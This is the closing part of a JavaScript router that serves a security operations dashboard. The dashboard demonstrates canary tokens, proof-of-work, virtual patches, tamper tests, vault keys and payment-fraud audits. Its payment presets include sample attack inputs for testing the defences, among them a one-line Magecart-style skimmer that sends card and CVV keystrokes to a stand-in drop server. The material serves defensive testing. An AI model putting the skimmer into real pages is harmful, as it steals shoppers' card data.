        const res = await fetch('/api/canary/generate', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ type, context: { generated_from: 'SOC_DASHBOARD' } })
        });
        const data = await res.json();
        document.getElementById('canary-input').value = data.honeytoken.token;
        box.textContent = JSON.stringify(data, null, 2);
      } catch (err) {
        box.textContent = "Error: " + err.message;
      }
    }

    async function triggerTripwire() {
      const box = document.getElementById('result-box');
      const token = document.getElementById('canary-input').value;
      if (!token) return alert('Generate a canary token first!');
      box.textContent = "Simulating attacker triggering Canary tripwire...";
      try {
        const res = await fetch('/api/canary/tripwire', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ token })
        });
        const data = await res.json();
        box.textContent = JSON.stringify(data, null, 2);
        fetchMetrics();
      } catch (err) {
        box.textContent = "Error: " + err.message;
      }
    }

    let activePowChallenge = null;
    async function requestPowChallenge() {
      const box = document.getElementById('result-box');
      box.textContent = "Requesting Proof-of-Work challenge from server...";
      try {
        const res = await fetch('/api/pow/challenge?difficulty=3');
        const data = await res.json();
        activePowChallenge = data.challenge;
        box.textContent = JSON.stringify(data, null, 2);
      } catch (err) {
        box.textContent = "Error: " + err.message;
      }
    }

    async function solveAndVerifyPow() {
      const box = document.getElementById('result-box');
      if (!activePowChallenge) {
        await requestPowChallenge();
      }
      box.textContent = "Solving Proof-of-Work mini-puzzle in browser Web Crypto...";
      try {
        const salt = activePowChallenge.salt;
        const diff = activePowChallenge.difficulty;
        const target = "0".repeat(diff);
        let nonce = 0;
        const enc = new TextEncoder();
        
        while (true) {
          const buf = await crypto.subtle.digest("SHA-256", enc.encode(salt + String(nonce)));
          const hex = Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, "0")).join("");
          if (hex.startsWith(target)) {
            break;
          }
          nonce++;
        }

        const res = await fetch('/api/pow/verify', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ challengeId: activePowChallenge.challengeId, nonce })
        });
        const data = await res.json();
        box.textContent = JSON.stringify(data, null, 2);
      } catch (err) {
        box.textContent = "Error: " + err.message;
      }
    }

    async function fetchVirtualPatches() {
      const box = document.getElementById('result-box');
      box.textContent = "Loading active in-memory virtual patches...";
      try {
        const res = await fetch('/api/patch/list');
        const data = await res.json();
        box.textContent = JSON.stringify(data, null, 2);
      } catch (err) {
        box.textContent = "Error: " + err.message;
      }
    }

    async function deploySamplePatch() {
      const box = document.getElementById('result-box');
      box.textContent = "Deploying emergency in-memory virtual patch...";
      try {
        const res = await fetch('/api/patch/apply', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            name: "Emergency SQLi Shield for /api/catalog",
            path: "^/api/catalog.*",
            method: "ALL",
            rules: [{ field: "body.*", op: "DISALLOW_SQL_SYNTAX" }]
          })
        });
        const data = await res.json();
        box.textContent = JSON.stringify(data, null, 2);
      } catch (err) {
        box.textContent = "Error: " + err.message;
      }
    }

    async function fetchDossier() {
      const box = document.getElementById('result-box');
      const ip = document.getElementById('profiler-ip').value;
      box.textContent = "Compiling MITRE ATT&CK Threat Dossier for " + ip + "...";
      try {
        const res = await fetch('/api/threat-profile/' + encodeURIComponent(ip));
        const data = await res.json();
        box.textContent = JSON.stringify(data, null, 2);
      } catch (err) {
        box.textContent = "Error: " + err.message;
      }
    }

    let activeSignSession = null;
    async function initSigningSession() {
      const box = document.getElementById('result-box');
      box.textContent = "Requesting client-side ephemeral signing ticket...";
      try {
        const res = await fetch('/api/signer/session', { method: 'POST' });
        activeSignSession = await res.json();
        box.textContent = JSON.stringify(activeSignSession, null, 2);
      } catch (err) {
        box.textContent = "Error: " + err.message;
      }
    }

    async function simulateTamperTest() {
      const box = document.getElementById('result-box');
      if (!activeSignSession) {
        await initSigningSession();
      }
      box.textContent = "Simulating attacker altering price from $1200 to $1 in DevTools...";
      try {
        const fakeSig = "deadbeef_fake_tampered_signature_99999999";
        const res = await fetch('/api/defend', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'x-fortress-session-id': activeSignSession.sessionId,
            'x-fortress-signature': fakeSig,
            'x-fortress-timestamp': String(Math.floor(Date.now() / 1000)),
            'x-fortress-nonce': "nonce_tamper_attack"
          },
          body: JSON.stringify({
            path: "/api/checkout",
            body: { productId: "laptop_99", total: 1.00 }
          })
        });
        const data = await res.json();
        box.textContent = JSON.stringify(data, null, 2);
        fetchMetrics();
      } catch (err) {
        box.textContent = "Error: " + err.message;
      }
    }

    async function fetchMetrics() {
      try {
        const res = await fetch('/api/jail');
        const data = await res.json();
        document.getElementById('stat-total').textContent = data.metrics.totalRequests;
        document.getElementById('stat-blocked').textContent = data.metrics.totalBlocked;
        document.getElementById('stat-banned').textContent = data.banned_ips.length;

        const feed = document.getElementById('feed-list');
        if (data.recent_events && data.recent_events.length > 0) {
          feed.innerHTML = data.recent_events.map(ev => \`
            <div class="feed-item \${ev.threat_level || 'ALLOW'}">
              <div class="feed-header">
                <span style="color: \${ev.action === 'ALLOW' ? 'var(--success)' : 'var(--accent)'}">[\${ev.action}] \${ev.wall}</span>
                <span>\${new Date(ev.timestamp).toLocaleTimeString()}</span>
              </div>
              <div class="feed-reason">\${ev.reason || 'No description'}</div>
              <div style="font-size: 11px; color: var(--text-muted); font-family: 'JetBrains Mono'; margin-top: 4px;">
                🎯 <strong style="color: var(--primary);">Attacker:</strong> \${ev.ip}\${ev.port && ev.port !== 'unknown' ? ':' + ev.port : ''} | 
                <strong>Path:</strong> \${ev.path || '/'}
              </div>
              \${ev.evidence ? \`<div style="font-size: 10px; color: var(--warning); font-family: 'JetBrains Mono'; margin-top: 2px;">⚡ Evidence: \${ev.evidence}</div>\` : ''}
              \${ev.user_agent && ev.user_agent !== 'unknown' ? \`<div style="font-size: 10px; color: #64748b; font-family: 'JetBrains Mono'; margin-top: 2px;">🕵️ UA: \${ev.user_agent}</div>\` : ''}
            </div>
          \`).join('');
        }
      } catch {}
    }

    async function loadVaultKeys() {
      const listEl = document.getElementById('vault-keys-list');
      try {
        const res = await fetch('/api/vault/keys');
        const data = await res.json();
        if (!res.ok) {
          listEl.innerHTML = \`<div style="color: var(--accent); padding: 8px;">⚠️ \${data.reason || 'Master Admin authentication required.'}</div>\`;
          return;
        }
        if (!data.keys || data.keys.length === 0) {
          listEl.innerHTML = \`<div style="color: var(--text-muted); padding: 8px;">No client keys issued yet. Generate one above!</div>\`;
          return;
        }
        listEl.innerHTML = data.keys.map(k => \`
          <div style="background: rgba(255,255,255,0.03); border: 1px solid \${k.status === 'ACTIVE' ? 'var(--card-border)' : 'rgba(255,0,85,0.3)'}; border-radius: 6px; padding: 10px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 8px;">
            <div>
              <div style="color: #fff; font-weight: 600;">\${k.name} <span style="font-size: 9px; padding: 2px 6px; border-radius: 4px; background: \${k.status === 'ACTIVE' ? 'rgba(0,255,136,0.15)' : 'rgba(255,0,85,0.15)'}; color: \${k.status === 'ACTIVE' ? 'var(--success)' : 'var(--accent)'}">\${k.status}</span></div>
              <div style="color: var(--primary); font-size: 11px;">\${k.maskedKey}</div>
              <div style="color: var(--text-muted); font-size: 10px;">Quota: \${k.usageCount} / \${k.quota} requests used</div>
            </div>
            \${k.status === 'ACTIVE' ? \`<button class="preset-btn" style="border-color: rgba(255,0,85,0.4); color: #ff0055;" onclick="revokeVaultKey('\${k.id}')">Revoke</button>\` : '<span style="color: #64748b; font-size: 10px;">Revoked</span>'}
          </div>
        \`).join('');
      } catch (err) {
        listEl.innerHTML = \`<div style="color: var(--accent); padding: 8px;">Error loading keys: \${err.message}</div>\`;
      }
    }

    async function issueVaultKey() {
      const name = document.getElementById('new-key-name').value.trim();
      const quota = parseInt(document.getElementById('new-key-quota').value, 10) || 1000;
      const role = document.getElementById('new-key-role').value;
      const box = document.getElementById('result-box');

      if (!name) {
        alert("Please enter a recipient name (e.g. Alex).");
        return;
      }

      box.textContent = "Generating new Vault Client Key...";
      try {
        const res = await fetch('/api/vault/keys', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ name, quota, role })
        });
        const data = await res.json();
        box.textContent = JSON.stringify(data, null, 2);

        if (res.ok && data.key_details) {
          navigator.clipboard.writeText(data.key_details.key).catch(() => {});
          alert(\`Vault Key created for \${name}!\\n\\nKey: \${data.key_details.key}\\n\\n(Copied to clipboard! Send this to them)\`);
          document.getElementById('new-key-name').value = '';
          loadVaultKeys();
        }
      } catch (err) {
        box.textContent = "Error: " + err.message;
      }
    }

    async function revokeVaultKey(id) {
      if (!confirm("Are you sure you want to revoke this key? The recipient will be immediately blocked from using the API.")) return;
      const box = document.getElementById('result-box');
      box.textContent = \`Revoking key \${id}...\`;
      try {
        const res = await fetch(\`/api/vault/keys/\${id}\`, { method: 'DELETE' });
        const data = await res.json();
        box.textContent = JSON.stringify(data, null, 2);
        loadVaultKeys();
      } catch (err) {
        box.textContent = "Error: " + err.message;
      }
    }

    function logoutVault() {
      document.cookie = "vault_token=; path=/; max-age=0;";
      localStorage.removeItem("fortress_vault_token");
      fetch('/api/vault/logout', { method: 'POST' }).finally(() => {
        window.location.reload();
      });
    }

    async function fetchLatestReport() {
      const el = document.getElementById('ai-report-display');
      const box = document.getElementById('result-box');
      document.getElementById('report-panel-label').textContent = 'ACTIVE: CISO EXECUTIVE THREAT DIGEST';
      el.innerHTML = '<div style="color: var(--primary);">Fetching latest AI Threat Digest...</div>';
      try {
        const res = await fetch('/api/reports/latest');
        const data = await res.json();
        box.textContent = JSON.stringify(data, null, 2);
        if (!res.ok || !data.report) {
          el.innerHTML = '<div style="color: var(--accent);">⚠️ Failed to load report. Ensure Master Pass is set.</div>';
          return;
        }
        const r = data.report;
        let html = '<div style="border-bottom: 1px solid var(--card-border); padding-bottom: 8px; margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center;">';
        html += '<span style="color: var(--primary); font-weight: 700;">DIGEST #' + r.report_id + ' (' + r.interval_hours + 'H WINDOW)</span>';
        const badgeColor = r.threat_posture === 'FORTIFIED_AND_OPTIMAL' ? 'var(--success)' : 'var(--accent)';
        const badgeBg = r.threat_posture === 'FORTIFIED_AND_OPTIMAL' ? 'rgba(0,255,136,0.2)' : 'rgba(255,0,85,0.2)';
        html += '<span style="padding: 2px 8px; border-radius: 4px; font-size: 10px; background: ' + badgeBg + '; color: ' + badgeColor + '; font-weight: 700;">' + r.threat_posture + '</span></div>';
        html += '<div style="color: #fff; line-height: 1.6; margin-bottom: 10px;">' + r.executive_summary + '</div>';
        html += '<div style="color: var(--warning); font-weight: 600; margin-bottom: 4px;">TOP VECTORS IDENTIFIED:</div>';
        html += '<ul style="padding-left: 18px; color: var(--text-muted); margin-bottom: 10px;">';
        (r.attack_vector_breakdown || []).forEach(function(v) { html += '<li>' + v + '</li>'; });
        html += '</ul>';
        html += '<div style="color: var(--primary); font-weight: 600; margin-bottom: 4px;">CISO RECOMMENDATIONS:</div>';
        html += '<ul style="padding-left: 18px; color: #a5b4fc;">';
        (r.ciso_recommendations || []).forEach(function(rec) { html += '<li>' + rec + '</li>'; });
        html += '</ul>';
        html += '<div style="margin-top: 8px; font-size: 10px; color: #64748b;">Synthesized by ' + r.model_used + ' • ' + new Date(r.timestamp).toLocaleString() + '</div>';
        el.innerHTML = html;
      } catch (err) {
        el.innerHTML = '<div style="color: var(--accent);">Error: ' + err.message + '</div>';
      }
    }

    async function fetchPciDssReport() {
      const el = document.getElementById('ai-report-display');
      const box = document.getElementById('result-box');
      document.getElementById('report-panel-label').textContent = 'ACTIVE: PCI-DSS v4.0 FINANCIAL PAYMENT AUDIT';
      el.innerHTML = '<div style="color: var(--success);">Compiling PCI-DSS v4.0 Financial Payment Compliance Audit...</div>';
      try {
        const res = await fetch('/api/reports/pci-dss');
        const data = await res.json();
        box.textContent = JSON.stringify(data, null, 2);
        if (!res.ok) {
          el.innerHTML = '<div style="color: var(--accent);">⚠️ Failed to load PCI-DSS report: ' + (data.message || res.statusText) + '</div>';
          return;
        }
        let html = '<div style="border-bottom: 1px solid var(--card-border); padding-bottom: 8px; margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center;">';
        html += '<span style="color: var(--success); font-weight: 700;">💳 ' + data.standard + '</span>';
        html += '<span style="padding: 2px 8px; border-radius: 4px; font-size: 10px; background: rgba(0,255,136,0.2); color: var(--success); font-weight: 700;">' + data.overall_compliance_status + ' (' + data.audit_score + ')</span></div>';
        html += '<div style="display: flex; flex-direction: column; gap: 8px; margin-top: 8px;">';
        (data.verified_safeguards || []).forEach(function(s) {
          html += '<div style="background: rgba(255,255,255,0.03); border: 1px solid var(--card-border); border-radius: 6px; padding: 8px;">';
          html += '<div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 4px;">';
          html += '<strong style="color: #fff;">' + s.requirement + '</strong>';
          html += '<span style="font-size: 9px; padding: 2px 6px; border-radius: 4px; background: rgba(0,255,136,0.15); color: var(--success);">' + s.status + '</span>';
          html += '</div>';
          html += '<div style="font-size: 10px; color: var(--primary); margin-bottom: 2px;">🛡️ Shield: ' + s.shield + '</div>';
          html += '<div style="font-size: 10px; color: var(--text-muted);">' + s.details + '</div>';
          html += '</div>';
        });
        html += '</div>';
        html += '<div style="margin-top: 10px; font-size: 10px; color: #64748b;">Audited at ' + new Date(data.timestamp).toLocaleString() + '</div>';
        el.innerHTML = html;
      } catch (err) {
        el.innerHTML = '<div style="color: var(--accent);">Error: ' + err.message + '</div>';
      }
    }

    async function fetchOwaspReport() {
      const el = document.getElementById('ai-report-display');
      const box = document.getElementById('result-box');
      document.getElementById('report-panel-label').textContent = 'ACTIVE: OWASP API SECURITY TOP 10 SCORECARD (2023)';
      el.innerHTML = '<div style="color: var(--warning);">Auditing OWASP API Security Top 10 posture...</div>';
      try {
        const res = await fetch('/api/reports/owasp');
        const data = await res.json();
        box.textContent = JSON.stringify(data, null, 2);
        if (!res.ok) {
          el.innerHTML = '<div style="color: var(--accent);">⚠️ Failed to load OWASP scorecard: ' + (data.message || res.statusText) + '</div>';
          return;
        }
        let html = '<div style="border-bottom: 1px solid var(--card-border); padding-bottom: 8px; margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center;">';
        html += '<span style="color: var(--warning); font-weight: 700;">🛡️ ' + data.standard + '</span>';
        html += '<span style="padding: 2px 8px; border-radius: 4px; font-size: 10px; background: rgba(255,184,0,0.2); color: var(--warning); font-weight: 700;">POSTURE GRADE: ' + data.posture_grade + '</span></div>';
        html += '<div style="display: flex; flex-direction: column; gap: 8px; margin-top: 8px;">';
        (data.top_10_matrix || []).forEach(function(m) {
          html += '<div style="background: rgba(255,255,255,0.03); border: 1px solid var(--card-border); border-radius: 6px; padding: 8px;">';
          html += '<div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 4px;">';
          html += '<strong style="color: #fff;">[' + m.id + '] ' + m.name + '</strong>';
          html += '<span style="font-size: 9px; padding: 2px 6px; border-radius: 4px; background: rgba(0,255,136,0.15); color: var(--success);">' + m.status + '</span>';
          html += '</div>';
          html += '<div style="font-size: 10px; color: var(--primary); margin-bottom: 2px;">⚡ Defense: ' + m.layer + '</div>';
          html += '<div style="font-size: 10px; color: var(--text-muted);">' + m.defense_summary + '</div>';
          html += '</div>';
        });
        html += '</div>';
        html += '<div style="margin-top: 10px; font-size: 10px; color: #64748b;">Audited at ' + new Date(data.timestamp).toLocaleString() + '</div>';
        el.innerHTML = html;
      } catch (err) {
        el.innerHTML = '<div style="color: var(--accent);">Error: ' + err.message + '</div>';
      }
    }

    async function fetchThreatActorsReport() {
      const el = document.getElementById('ai-report-display');
      const box = document.getElementById('result-box');
      document.getElementById('report-panel-label').textContent = 'ACTIVE: MITRE ATT&CK THREAT ACTOR RECON DOSSIER';
      el.innerHTML = '<div style="color: var(--accent);">Compiling adversary profile & MITRE ATT&CK matrix...</div>';
      try {
        const res = await fetch('/api/reports/threat-actors');
        const data = await res.json();
        box.textContent = JSON.stringify(data, null, 2);
        if (!res.ok) {
          el.innerHTML = '<div style="color: var(--accent);">⚠️ Failed to load Threat Dossier: ' + (data.message || res.statusText) + '</div>';
          return;
        }
        let html = '<div style="border-bottom: 1px solid var(--card-border); padding-bottom: 8px; margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center;">';
        html += '<span style="color: var(--accent); font-weight: 700;">🎯 MITRE ATT&CK RECON DOSSIER</span>';
        html += '<span style="padding: 2px 8px; border-radius: 4px; font-size: 10px; background: rgba(255,0,85,0.2); color: var(--accent); font-weight: 700;">' + data.total_adversaries_profiled + ' ADVERSARIES TRACKED</span></div>';
        html += '<div style="color: var(--warning); font-weight: 600; margin-bottom: 6px;">OBSERVED ADVERSARY TTPs (TACTICS & TECHNIQUES):</div>';
        html += '<div style="display: flex; flex-direction: column; gap: 6px; margin-bottom: 10px;">';
        (data.observed_mitre_ttps || []).forEach(function(t) {
          html += '<div style="background: rgba(255,255,255,0.03); border: 1px solid var(--card-border); border-radius: 6px; padding: 8px;">';
          html += '<div style="display: flex; justify-content: space-between; align-items: center;">';
          html += '<strong style="color: #fff;">' + t.technique_id + ': ' + t.technique_name + '</strong>';
          html += '<span style="font-size: 9px; padding: 2px 6px; border-radius: 4px; background: rgba(255,0,85,0.15); color: var(--accent);">' + t.hits + ' Intercepts</span>';
          html += '</div>';
          html += '<div style="font-size: 10px; color: var(--text-muted); margin-top: 2px;">Tactic: ' + t.tactic + ' | Neutralizer: ' + t.fortress_neutralizer + '</div>';
          html += '</div>';
        });
        html += '</div>';
        html += '<div style="color: var(--primary); font-weight: 600; margin-bottom: 4px;">HONEYTOKEN TRIPWIRE CASUALTIES: ' + (data.honeytoken_tripwire_casualties || []).length + '</div>';
        html += '<div style="margin-top: 8px; font-size: 10px; color: #64748b;">Audited at ' + new Date(data.timestamp).toLocaleString() + '</div>';
        el.innerHTML = html;
      } catch (err) {
        el.innerHTML = '<div style="color: var(--accent);">Error: ' + err.message + '</div>';
      }
    }

    async function generateAiReportNow() {
      const box = document.getElementById('result-box');
      box.textContent = "Synthesizing live security intelligence with Google Gemini AI...";
      try {
        const res = await fetch('/api/reports/generate-now', { method: 'POST' });
        const data = await res.json();
        box.textContent = JSON.stringify(data, null, 2);
        fetchLatestReport();
      } catch (err) {
        box.textContent = "Error: " + err.message;
      }
    }

    async function updateReportSchedule() {
      const intervalHours = parseInt(document.getElementById('report-schedule-interval').value, 10);
      const box = document.getElementById('result-box');
      box.textContent = "Updating AI Report interval to " + intervalHours + " hours...";
      try {
        const res = await fetch('/api/reports/schedule', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ intervalHours })
        });
        const data = await res.json();
        box.textContent = JSON.stringify(data, null, 2);
        alert("Schedule updated! FORTRESS will synthesize and dispatch AI reports every " + intervalHours + " hour(s).");
      } catch (err) {
        box.textContent = "Error: " + err.message;
      }
    }

    const paymentPresets = {
      carding_bot: {
        cardNumber: "4111111111111111",
        amount: 25.00,
        currency: "USD",
        cvv: "123",
        orderId: "ORD-CARDING-TEST"
      },
      fractional_cent: {
        amount: 0.0001,
        currency: "USD",
        productId: "prod_gold_99",
        description: "Fractional Cent Salami Slicing Attack"
      },
      currency_switch: {
        amount: 100,
        currency: "RUB",
        productId: "luxury_watch_1",
        description: "Currency Arbitrage Switching Exploit"
      },
      magecart: "document.addEventListener('keypress', function(e) { if(e.target.name === 'card' || e.target.name === 'cvv') { navigator.sendBeacon('https://malicious-drop-server.org/collect', btoa(e.target.value)); } });",
      fake_webhook: {
        gateway: "stripe",
        rawBody: '{"id":"evt_test_123","type":"payment_intent.succeeded","data":{"object":{"amount":120000}}}',
        headers: { "x-attacker": "forged_request_without_secret" }
      }
    };

    function loadPaymentPreset(key) {
      const el = document.getElementById('payment-payload');
      const val = paymentPresets[key];
      el.value = typeof val === 'string' ? val : JSON.stringify(val, null, 2);
    }

    async function runPaymentAudit() {
      const box = document.getElementById('result-box');
      box.textContent = "Auditing transaction against Luhn, carding velocity, and precision checks...";
      try {
        const text = document.getElementById('payment-payload').value;
        const body = JSON.parse(text);
        let endpoint = '/api/payment/audit-transaction';
        if (body.gateway && body.rawBody) {
          endpoint = '/api/payment/verify-webhook';
        }
        const res = await fetch(endpoint, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(body)
        });
        const data = await res.json();
        box.textContent = JSON.stringify(data, null, 2);
        fetchMetrics();
      } catch (err) {
        box.textContent = "Error: " + err.message;
      }
    }

    async function runMagecartAudit() {
      const box = document.getElementById('result-box');
      box.textContent = "Analyzing script for Magecart web-skimmer and form-jacking indicators...";
      try {
        const scriptContent = document.getElementById('payment-payload').value;
        const res = await fetch('/api/payment/audit-checkout-script', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ scriptContent })
        });
        const data = await res.json();
        box.textContent = JSON.stringify(data, null, 2);
      } catch (err) {
        box.textContent = "Error: " + err.message;
      }
    }

    async function loadPaymentTelemetry() {
      const box = document.getElementById('result-box');
      box.textContent = "Fetching real-time payment gateway defense telemetry...";
      try {
        const res = await fetch('/api/payment/telemetry');
        const data = await res.json();
        box.textContent = JSON.stringify(data, null, 2);
      } catch (err) {
        box.textContent = "Error: " + err.message;
      }
    }

    setInterval(fetchMetrics, 3000);
    fetchMetrics();
  </script>
</body>
</html>`;

  res.setHeader("Content-Type", "text/html; charset=utf-8");
  return res.send(html);
});

export default router;
